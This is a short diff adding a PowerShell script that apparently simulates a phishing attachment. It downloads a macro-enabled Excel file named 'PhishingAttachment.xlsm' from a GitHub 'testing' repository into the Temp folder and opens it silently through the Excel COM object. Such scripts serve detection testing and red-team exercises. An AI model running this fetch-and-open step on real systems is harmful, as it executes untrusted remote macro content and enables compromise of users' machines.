@@ -1,0 +1,6 @@
+$url = 'https://github.com/FullOn523/testing/PhishingAttachment.xlsm'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri $url -OutFile $env:Temp\PhishingAttachment.xlsm
+$excel = New-Object -ComObject Excel.Application
+$filepath = "$env:Temp\PhishingAttachment.xlsm"
+$workbook = $excel.Workbooks.Open($filepath)
